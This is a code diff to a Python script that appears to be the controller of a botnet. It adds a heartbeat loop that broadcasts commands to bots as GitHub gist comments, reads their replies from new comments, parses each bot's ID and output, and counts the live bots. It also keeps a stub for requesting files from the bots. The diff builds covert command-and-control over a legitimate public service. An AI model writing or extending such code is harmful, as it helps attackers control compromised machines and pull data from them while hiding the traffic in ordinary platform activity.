@@ -1,23 +1,67 @@
 import argparse
+import time
 import utils
 from utils import Command
 
+REFRESH_DELAY = 360  # 6 minutes
 
+LAST_COMMENT = 0
+
+
+# TODO: better message
 def error():
-    print("Bad input")  # TODO
+    print("Bad input")
 
 
 def heartbeat():
-    # TODO
-    return
+    while True:
+        send_heartbeat()
+        time.sleep(REFRESH_DELAY)
+        check_bots()
 
 
-def send_command(botid, cmd, data, respond):
-    # TODO
-    return
+def send_heartbeat():
+    return send_command(utils.BROADCAST, Command.HEARTBEAT, "", True)
 
 
-def request_file(botid, filepath, respond):
+def check_bots():
+    global LAST_COMMENT
+    data, LAST_COMMENT = utils.get_fresh_comments(LAST_COMMENT)
+
+    alive = set()
+    for comment in data:
+        bot, d = parse_response(comment['body'])
+        alive.add(bot)
+        show_response(bot, d)
+    
+    print(" >>> ALIVE: " + str(len(alive)) + '\n')
+    return alive
+
+
+# TODO rework
+# TODO: check if parsable
+def parse_response(comment):
+    s = comment.find('\n')
+    bot = int(comment[:s])
+    data = comment[s+1:]
+    return bot, data
+
+
+def show_response(bot, data):
+    print(str(bot) + ':\n' + data + '\n')
+
+
+def send_command(bot, cmd, data, respond):
+    comment = parse_command(bot, cmd, data, respond)
+    return utils.post_gist_comment(comment)
+
+
+# TODO rework
+def parse_command(bot, cmd, data, respond):
+    return str(bot) + '\n' + cmd.name + '\n' + data + '\n' + str(int(respond)) + '\n'
+
+
+def request_file(bot, filepath, respond):
     # TODO
     return
 
@@ -63,9 +107,4 @@ if __name__ == "__main__":
     parser.add_argument('-s', '--silent', action='store_true')
 
     args = parser.parse_args()
-    # print(args.command)
-    # print(args.data)
-    # print(args.bot)
-    # print(args.silent)
-
     handle_input(args)
